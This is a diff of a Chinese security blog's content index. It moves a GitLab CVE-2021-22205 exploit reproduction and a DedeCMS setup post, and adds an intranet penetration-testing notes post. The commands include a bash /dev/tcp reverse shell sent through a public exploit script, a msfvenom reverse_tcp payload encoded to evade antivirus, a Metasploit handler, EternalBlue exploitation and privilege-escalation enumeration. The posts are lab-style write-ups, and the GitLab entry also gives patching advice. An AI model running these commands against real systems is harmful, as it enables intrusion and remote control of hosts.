@@ -289,6 +289,42 @@ stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" c
       </tags>
   </entry>
   <entry>
+    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
+    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
+app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
+<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
+<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
+<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
+<pre class="line-numbers language-none"><code class="language-none">反弹shell：
+
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，对写入成功的sh脚本加执行权限
+python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
+这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
+<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
+<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.11</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现</title>
     <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
@@ -853,40 +889,40 @@ int main(int argc, char *argv[])
       </tags>
   </entry>
   <entry>
-    <title>【CVE-2021-22205】GitLab 远程命令执行漏洞复现</title>
-    <url>/2021/11/07/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;GitLab&quot;
-app&#x3D;&quot;GitLab&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>GitLab 是由GitLab Inc.开发的一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，可通过Web界面访问公开或私人项目。<br>由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。由于GitLab中的ExifTool没有对传入的图像文件的扩展名进行正确处理，攻击者通过上传特制的恶意图片，可以在目标服务器上执行任意命令。<br><strong>根本原因</strong><br>1.当上传图片文件时，Gitlab Workhorse将扩展名为jpg|jpeg|tiff的文件通过ExifTool删除任何非白名单标记。<br>2.其中一个支持的格式是DjVu。当解析DjVu注释时，标记被赋值为convert C escape sequences。</p>
-<p>Gitlab链接：<br><a href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/">https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/</a></p>
-<h3 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h3><p>CVSS：9.9 | 高危</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>11.9 &lt;= Gitlab CE/EE &lt; 13.8.8<br>12.13.9 &lt;= Gitlab CE/EE &lt; 13.9.6<br>13.13.10 &lt;= Gitlab CE/EE &lt; 13.10.3</p>
-<h3 id="漏洞PoC"><a href="#漏洞PoC" class="headerlink" title="漏洞PoC"></a>漏洞PoC</h3><p><a href="https://github.com/RedTeamWing/CVE-2021-22205">https://github.com/RedTeamWing/CVE-2021-22205</a><br><a href="https://github.com/Al1ex/CVE-2021-22205">https://github.com/Al1ex/CVE-2021-22205</a></p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="证明存在"><a href="#证明存在" class="headerlink" title="证明存在"></a>证明存在</h4><p>先修改PoC里面的dnslog地址为自己的<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>利用PoC，我这里用的是pocsuite3测试框架<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>发现自己的dnslog有回显，证明利用成功，该站存在此漏洞<br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里利用的是前面的第二个PoC</p>
-<pre class="line-numbers language-none"><code class="language-none">反弹shell：
-
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;echo &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，将反弹shell命令写成sh脚本 到tmp目录下
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;chmod +x &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，对写入成功的sh脚本加执行权限
-python3 CVE-2021-2205.py -a true -t http:&#x2F;&#x2F;Your IP:port -c &quot;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.sh&quot;
-这条语句意思是代表，运行反弹shell脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"><br><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"></p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="版本检测"><a href="#版本检测" class="headerlink" title="版本检测"></a>版本检测</h4><p>相关用户可通过版本检测的方法判断当前应用是否存在风险。<br>使用如下命令可查看当前GitLab的版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"></p>
-<h4 id="官方升级"><a href="#官方升级" class="headerlink" title="官方升级"></a>官方升级</h4><p>目前官方已发布新版本修复了该漏洞，请受影响的用户尽快升级至最新版本进行防护，官方下载链接如下：<a href="https://about.gitlab.com/update/">https://about.gitlab.com/update/</a></p>
-<h4 id="临时防护措施"><a href="#临时防护措施" class="headerlink" title="临时防护措施"></a>临时防护措施</h4><p>若相关用户暂时无法进行升级操作，可使用白名单限制对Web端口的访问。配置访问控制策略，避免受影响的GitLab暴露在公网</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/cn-gov/p/15490588.html">https://www.cnblogs.com/cn-gov/p/15490588.html</a><br><a href="https://zhuanlan.zhihu.com/p/426847373">https://zhuanlan.zhihu.com/p/426847373</a><br><a href="https://www.cnblogs.com/ybit/p/14918949.html">https://www.cnblogs.com/ybit/p/14918949.html</a><br><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></p>
+    <title>dedecms网站搭建</title>
+    <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<ol>
+<li>下载织梦开源程序</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
+<ol start="2">
+<li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
+<li>访问127.0.0.1的DedeCMS网址</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/2.png" alt="图片"></p>
+<ol start="4">
+<li>点击继续</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/3.png" alt="图片"></p>
+<ol start="5">
+<li>点继续，进入参数配置页面，数据库主机：localhost，数据库用户：root，数据库密码：root，对于PHPstudy本地环境来说，这几项是固定的，在这里的数据库名称可以更改，也可以不更改。接着再自己设置一下用户名、密码、网站名称、管理员邮箱即可点击继续安装。</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/4.png" alt="图片"></p>
+<ol start="6">
+<li>安装完成，登录网站后台</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/5.png" alt="图片"></p>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/6.png" alt="图片"></p>
+<ol start="7">
+<li>登陆成功！</li>
+</ol>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/7.png" alt="图片"></p>
+<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/8.png" alt="图片"></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
-        <category>漏洞复现</category>
+        <category>环境搭建</category>
       </categories>
-      <tags>
-        <tag>2021.11</tag>
-      </tags>
   </entry>
   <entry>
     <title>【MS17-010】永恒之蓝漏洞复现</title>
@@ -925,42 +961,6 @@ set LHOST 192.168.141.133<span aria-hidden="true" class="line-numbers-rows"><spa
       <tags>
         <tag>2017.3</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>dedecms网站搭建</title>
-    <url>/2021/01/21/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<ol>
-<li>下载织梦开源程序</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/1.png" alt="图片"></p>
-<ol start="2">
-<li>解压织梦程序安装包，将uploads里面所有的程序文件，复制粘贴到phpstudy的WWW文件夹里面。</li>
-<li>访问127.0.0.1的DedeCMS网址</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/2.png" alt="图片"></p>
-<ol start="4">
-<li>点击继续</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/3.png" alt="图片"></p>
-<ol start="5">
-<li>点继续，进入参数配置页面，数据库主机：localhost，数据库用户：root，数据库密码：root，对于PHPstudy本地环境来说，这几项是固定的，在这里的数据库名称可以更改，也可以不更改。接着再自己设置一下用户名、密码、网站名称、管理员邮箱即可点击继续安装。</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/4.png" alt="图片"></p>
-<ol start="6">
-<li>安装完成，登录网站后台</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/5.png" alt="图片"></p>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/6.png" alt="图片"></p>
-<ol start="7">
-<li>登陆成功！</li>
-</ol>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/7.png" alt="图片"></p>
-<p><img src="/images/dedecms%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/8.png" alt="图片"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>环境搭建</category>
-      </categories>
   </entry>
   <entry>
     <title>【致远OA】ajax.do任意文件上传漏洞复现</title>
@@ -1004,6 +1004,259 @@ managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00
       </categories>
       <tags>
         <tag>2021.1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网学习笔记①</title>
+    <url>/2021/10/30/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/</url>
+    <content><![CDATA[<h3 id="0x00-本文顺序"><a href="#0x00-本文顺序" class="headerlink" title="0x00 本文顺序"></a>0x00 本文顺序</h3><p>内网架构及反弹shell-&gt;信息搜集1-&gt;本地提权-&gt;隧道搭建-&gt;信息搜集2</p>
+<p>提权与信息搜集是息息相关、相互嵌套的，你拿到怎样的权限才能获取相对应的信息，<strong>内网渗透就是不断获取信息的过程</strong>。在刚拿到内网机器时你的权限只允许你做简单的信息搜集，而之后需要根据之前搜集的内容进行提权，而要获取内网中其他主机的信息以及后续对于其他主机的渗透又需要隧道进行通信，所以在提权后进行隧道搭建，最后实施进一步的信息搜集。</p>
+<h3 id="0x01-内网架构及反弹shell"><a href="#0x01-内网架构及反弹shell" class="headerlink" title="0x01 内网架构及反弹shell"></a>0x01 内网架构及反弹shell</h3><h4 id="Ⅰ-内网环境"><a href="#Ⅰ-内网环境" class="headerlink" title="Ⅰ 内网环境"></a>Ⅰ 内网环境</h4><p>用一张图来表示（其中域名为lce.com）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/1.png" alt="图片"><br>可以看到攻击机kali与内网win7可以通信，win7、server2012（域控）和xp在同一个域内（lce.com），其中win7与server2012在同一个局域网，而server2012与xp又在另一个局域网内。</p>
+<p>目前情况是我们已经拿到了win7的webshell，接下来我们需要通过kali拿到反弹shell，之后我们再横向拿下域控，再进一步拿下xp这台主机。</p>
+<h4 id="Ⅱ-msf反弹shell"><a href="#Ⅱ-msf反弹shell" class="headerlink" title="Ⅱ msf反弹shell"></a>Ⅱ msf反弹shell</h4><p><strong>为什么要反弹shell</strong><br>一般来说目标主机与我们攻击者之间都存在防火墙等安全设备，限制了流入目标主机的流量，导致我们直接连接目标主机会失败。所以我们想让目标主机主动连接我们，这就是反弹shell。<br><strong>如何反弹shell</strong><br>反弹shell的方法有很多，这里推荐使用msfconsole+msfvenom，如果需要免杀还可以生成指令配合混淆免杀，比如Backdoor-factory等等。</p>
+<p>我们通过反弹shell，将10.188.16.131的win7的shell反弹给我们的攻击机10.188.10.200的kali。</p>
+<pre class="line-numbers language-none"><code class="language-none">1.生成目标文件
+    msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 5 LHOST&#x3D;10.188.10.200 LPORT&#x3D;6666 -f exe &gt; attack.exe
+2.通过webshell上传attack.exe到目标主机并运行。
+3.打开msf使用
+    use exploit&#x2F;multi&#x2F;handler
+    set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
+    show options 之后设置lpost和lhost即可
+    exploit
+4.得到反弹的meterpreter
+
+PS：msfvenom参数说明：
+        -p –payload &lt; payload&gt; 指定需要使用的payload
+        -l payloads 查看所有的攻击载荷
+        -e –encoder [encoder] 指定需要使用的encoder
+        -i 5 –iterations &lt;count&gt; 指定payload的编码次数为5次
+        -f 生成文件格式
+        lhost和lport分别为反弹到主机的ip和端口号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="0x02-信息搜集1"><a href="#0x02-信息搜集1" class="headerlink" title="0x02 信息搜集1"></a>0x02 信息搜集1</h3><p>本机信息搜集（主要任务是探测本机简单信息，为提权和进一步信息搜集做准备，其中有价值的信息主要是网段信息、用户账户和系统信息）<br>常用指令（按照是否常用顺序排列）：</p>
+<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;all     &#x2F;&#x2F;查询当前用户
+ipconfig &#x2F;all   &#x2F;&#x2F;列出网络信息
+net user        &#x2F;&#x2F;查询当前电脑的用户账户
+systeminfo      &#x2F;&#x2F;查询主机信息
+tasklist        &#x2F;&#x2F;查询进程列表
+query user      &#x2F;&#x2F;查询当前用户以及登陆时间等信息
+route print     &#x2F;&#x2F;打印路由
+arp -a          &#x2F;&#x2F;打印arp缓存信息
+netstat -ano | findstr &quot;3306&quot;   &#x2F;&#x2F;查询相关端口信息
+net share       &#x2F;&#x2F;查看共享资源
+net session     &#x2F;&#x2F;列出或断开本地计算机和与之连接的客户端的会话
+cmdkey list     &#x2F;&#x2F;列出本机凭据
+wmic product    &#x2F;&#x2F;查询安装软件信息
+wmic service    &#x2F;&#x2F;查询本机服务信息
+netsh firewall show config      &#x2F;&#x2F;查看防火墙设置
+net statistics workstation      &#x2F;&#x2F;本地工作站或服务器服务的统计记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其中ipconfig和net user以及systeminfo非常重要。</p>
+<p>通过ipconfig可以查看到当前主机位于哪个网段，如果还存在其他网段，那么极有可能存在另一个局域网区域。比如上述环境中的win7，既与kali在同一个外网，也存在于另一个网段192.168.174.1中。所以进一步的信息搜集可以对这个网段扫描。<br>通过net user可以查看有哪些用户存在，为下一步的域渗透和提权做准备。<br>通过systeminfo可以查看本机信息，获取哪些补丁没有打，为接下来提权做准备。</p>
+<h3 id="0x03-本地提权"><a href="#0x03-本地提权" class="headerlink" title="0x03 本地提权"></a>0x03 本地提权</h3><h4 id="Ⅰ-溢出漏洞提权"><a href="#Ⅰ-溢出漏洞提权" class="headerlink" title="Ⅰ 溢出漏洞提权"></a>Ⅰ 溢出漏洞提权</h4><p><strong>溢出漏洞</strong><br>缓冲区溢出漏洞，是由于恶意代码在执行时，向缓冲区写入超过其长度的内容，造成进程的堆栈被更改，进而执行恶意代码，达到了攻击的目的。</p>
+<p>我们主要需要利用工具找出系统相关系统漏洞并加以利用，配合msf或者Cobaltstrike等相关工具实现提权。</p>
+<pre class="line-numbers language-none"><code class="language-none">msf &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patches
+
+通过已经获取的meterpreter的session查询目标主机存在的可以利用的漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">windows-exploit-suggester.py -d vulinfo.xls -i systeminfo.txt
+
+其中systeminfo.txt内容是通过systeminfo命令获取的系统信息，里面记录了所有打过的补丁，
+windows-exploit-suggester.py这个py文件根据补丁记录与漏洞信息（vulinfo.xls)进行比较，
+获得可以利用的相关漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">import-module Sherlock.ps1
+find-allvulns
+
+首先导入Sherlock.ps1这个powershell模块，之后调用find-allvulns查询可以利用的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.\Vulmap.ps1
+
+直接执行脚本Vulmap.ps1，可以自动查询出本机可以利用的漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.\KBCollect.ps1             &#x2F;&#x2F;收集信息
+.\cve-check.py -u             &#x2F;&#x2F;创建CVEKB数据库
+.\cve-check.py -U             &#x2F;&#x2F;更新CVEKB数据库中的hasPOC字段
+.\cve-check.py -C -f KB.json  &#x2F;&#x2F;查看具有公开EXP的CVE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.\ms17-010-m4ss-sc4nn3r-master.exe 10.188.16.131
+
+查询IP主机是否存在ms17-010漏洞利用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>当然还有其它方法，这里就不一一列举了。在拿到可以利用的漏洞以后，可以使用msf自带的exploit模块进行攻击，或者在windows-kernel-exploits公开的收集库中查找可以用来提权的exp。</p>
+<p>我这里通过msf使用永恒之蓝（ms17-010）拿到win7的system权限。</p>
+<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue
+msf5 &gt; show options
+msf5 &gt; set rhost 10.188.16.131
+msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/2.png" alt="图片"></p>
